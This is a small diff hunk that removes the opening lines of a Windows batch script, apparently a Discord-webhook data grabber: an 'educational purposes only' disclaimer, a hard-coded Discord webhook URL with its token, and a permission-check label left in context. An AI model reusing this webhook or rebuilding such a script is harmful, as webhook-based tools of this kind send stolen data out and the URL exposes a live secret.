@@ -1,9 +1,3 @@
-@echo off
-:: i dont take any responsibility for damage done with the programm it's for educational purposes only
-::replace the YOURWEBHOOK field with your webhook
-set webhook=https://discord.com/api/webhooks/1197617434924953773/MhttNqvAbMn1_DKmQ7OBmTm76W_Az-sDSMshlgj98xIZVjIukhRrb-MkGNOolhS7VTIh
-
-
 
 
 :check_Permissions
